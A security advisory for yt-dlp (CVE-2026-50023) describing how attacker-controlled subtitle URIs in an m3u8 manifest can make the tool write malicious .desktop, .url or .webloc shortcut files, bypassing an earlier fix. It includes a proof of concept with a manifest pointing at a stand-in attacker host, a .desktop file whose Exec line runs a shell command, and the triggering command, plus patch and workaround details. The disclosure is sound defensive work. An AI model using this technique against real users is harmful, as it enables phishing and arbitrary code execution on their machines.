# [H] yt-dlp: Dangerous file type creation via insufficient filename sanitization (Bypass of CVE-2024-38519)

## Summary
Severity: High
Advisory: GHSA-c6mh-fpjc-4pr3
CVE: CVE-2026-50023
CWE: CWE-641
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-16
Source: https://github.com/advisories/GHSA-c6mh-fpjc-4pr3
Type: github-advisory

## Affected
- PyPI: `yt-dlp` — affected >=0 <2026.6.9

## Details
### Summary
A vulnerability exists in yt-dlp that allows a remote attacker to write arbitrary OS-shortcut files (such as `.desktop`, `.url`, `.webloc`) to the user's filesystem, bypassing the remediation for `CVE-2024-38519`. 

### Details
The fix for `CVE-2024-38519` enforced an allowlist for file extensions, in order to prevent writing files with unsafe extensions (such as `.exe` or `.sh`) during file downloads. However, this allowlist explicitly included the unsafe extensions `.desktop`, `.url`, and `.webloc` so that the functionality of the `--write-link` option (and its variants) could be preserved. These allowlist inclusions can be exploited by an attacker to write malicious OS-shortcut files in the context of a media or subtitles download.

Numerous yt-dlp extractors derive the downloaded media or subtitles file extension from a potentially attacker-controlled source. An attacker could craft an m3u8 file that contains an `EXT-X-MEDIA:TYPE=SUBTITLES` tag with a malicious URI (e.g., `URI="http://attacker/x.desktop"`), which would result in yt-dlp writing the attacker-controlled content to a file with a `.desktop` extension if the user had passed the `--write-subs` option.

Writing OS-shortcut files next to downloaded videos provides a high-probability social engineering vector. The extension of the shortcut file is often hidden from the user, e.g. on Windows by default or on many Linux desktop environments. 

While these shortcut files are typically used to point to web locations via URLs, they can also contain shell commands or point to remote executables. The user may be deceived into opening the malicious shortcut disguised as a "subtitles"/media file, leading to a phishing attack or arbitrary code execution.

### Proof of Concept
**1. Start a malicious server:**
Host a malicious `master.m3u8` manifest that points to malicious subtitle payloads:
```m3u8
#EXTM3U
#EXT-X-MEDIA:TYPE=SUBTITLES,GROUP-ID="subs",NAME="English",URI="http://attacker/payload.desktop",LANGUAGE="en"
```
And host the `payload.desktop` file with malicious content:
```ini
[Desktop Entry]
Type=Application
Exec=sh -c "touch /tmp/ytdlp_pwned_$(id -u)"
Name=Subtitle
```

**2. Trigger the download:**
In this case, the generic extractor triggers the exploit if the `--write-subs` option is used:
```bash
yt-dlp --write-subs -o "MyVideo.%(ext)s" "http://attacker/master.m3u8"
```

**Result:** yt-dlp writes `MyVideo.en.desktop` to disk, containing the attacker payload.

### Patches
yt-dlp version 2026.06.09 fixes this issue by removing `.url`, `.desktop` and `.webloc` from the global file extension allowlist, and by only allowing those file types to be written from within the context of the `--write-link` options' functionality.

### Workarounds
It is recommended to upgrade yt-dlp to version 2026.06.09 as soon as possible.

Users who are not able to upgrade should do ALL of the following:

- Only pass fully **trusted** input URLs to yt-dlp
- Do not use the `--write-subs`, `--write-auto-subs`, `--embed-subs`, `--write-thumbnail`, `--write-all-thumbnails`, or `--embed-thumbnail` options
- Use `--format -` to interactively select download formats and validate their file extensions

## References
- https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-c6mh-fpjc-4pr3
- https://nvd.nist.gov/vuln/detail/CVE-2024-38519
- https://nvd.nist.gov/vuln/detail/CVE-2026-50023
- https://github.com/yt-dlp/yt-dlp/commit/e578e265f7c6ca94a74b30e0d8d6196a4d19fb6a
- https://github.com/advisories/GHSA-c6mh-fpjc-4pr3
- https://github.com/pypa/advisory-database/tree/main/vulns/yt-dlp/PYSEC-2026-3430.yaml
- https://github.com/yt-dlp/yt-dlp
- https://github.com/yt-dlp/yt-dlp-nightly-builds/releases/tag/2026.06.09.230517
- https://github.com/yt-dlp/yt-dlp/releases/tag/2026.06.09
- https://pypi.org/project/yt-dlp
